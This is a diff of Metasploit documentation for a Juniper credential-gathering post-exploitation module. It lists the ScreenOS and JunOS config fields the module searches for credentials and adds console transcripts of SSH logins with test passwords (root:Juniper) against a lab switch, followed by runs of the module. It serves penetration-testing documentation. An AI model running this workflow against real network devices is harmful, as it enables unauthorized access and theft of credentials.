@@ -1,27 +1,27 @@
 ## Vulnerable Application
 
-  This module has been tested on the following hardware/OS combinations.
+This module has been tested on the following hardware/OS combinations.
 
-  * ScreenOS
-  * JunOS
-    * ex2200-48t-4g, JUNOS Base OS boot 12.3R7.7
+* ScreenOS
+* JunOS
+  * ex2200-48t-4g, JUNOS Base OS boot 12.3R7.7
 
-  The ex2200 config can be found [here](https://github.com/h00die/MSF-Testing-Scripts/blob/master/juniper_ex2200.config)
+The ex2200 config can be found [here](https://github.com/h00die/MSF-Testing-Scripts/blob/master/juniper_ex2200.config)
 
-  This module will look for the follow parameters which contain credentials:
+This module will look for the follow parameters which contain credentials:
 
-  * ScreenOS
-    * admin
-    * user
-    * SNMP
-    * ppp
-    * ike
-  * JunOS
-    * root-authentication
-    * user
-    * SNMP
-    * radius
-    * pptp/ppp (pap)
+* ScreenOS
+  * admin
+  * user
+  * SNMP
+  * ppp
+  * ike
+* JunOS
+  * root-authentication
+  * user
+  * SNMP
+  * radius
+  * pptp/ppp (pap)
 
 ## Verification Steps
 
@@ -32,6 +32,8 @@
   5. Do: ```set verbose true```
   6. Do: ```run```
 
+## Options
+
 ## Scenarios
 
 ### ex2200-48t-4g, JUNOS Base OS boot 12.3R7.7
@@ -39,6 +41,26 @@
 #### root Login (SSH Shell)
 
 ```
+msf5 > auxiliary/scanner/ssh/ssh_login
+msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.1.5
+rhosts => 192.168.1.5
+msf5 auxiliary(scanner/ssh/ssh_login) > set username root
+username => root
+msf5 auxiliary(scanner/ssh/ssh_login) > set password Juniper
+password => Juniper
+msf5 auxiliary(scanner/ssh/ssh_login) > run
+
+[+] 192.168.1.5:22 - Success: 'root:Juniper' 'Hostname: h00dieJuniperEx2200, Model: ex2200-48t-4g, JUNOS Base OS boot [12.3R7.7]'
+[*] Command shell session 1 opened (192.168.1.6:45623 -> 192.168.1.5:22) at 2020-07-14 20:48:58 -0400
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+```
+msf5 auxiliary(scanner/ssh/ssh_login) > use post/networking/gather/enum_juniper 
+msf5 post(networking/gather/enum_juniper) > set session 1
+session => 1
+msf5 post(networking/gather/enum_juniper) > run
 [*] In an SSH shell
 [*] Getting version information
 [*] Original OS Guess junos, is now JunOS 12.3R7.7
@@ -83,10 +105,22 @@ host         origin       service            public          private            
 #### cli Login
 
 ```
+msf5 > auxiliary/scanner/ssh/ssh_login
+msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.1.5
+rhosts => 192.168.1.5
+msf5 auxiliary(scanner/ssh/ssh_login) > set username newuser
+username => newuser
+msf5 auxiliary(scanner/ssh/ssh_login) > set password Newuser
+password => Newuser
+msf5 auxiliary(scanner/ssh/ssh_login) > run
+
 [+] 192.168.1.5:22 - Success: 'newuser:Newuser' 'Hostname: h00dieJuniperEx2200, Model: ex2200-48t-4g, JUNOS Base OS boot [12.3R7.7]'
 [*] Command shell session 2 opened (192.168.1.6:45623 -> 192.168.1.5:22) at 2018-02-19 21:32:20 -0500
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
+```
+
+```
 resource (juniper_ex2200.rc)> use post/networking/gather/enum_juniper
 resource (juniper_ex2200.rc)> set session 2
 session => 2
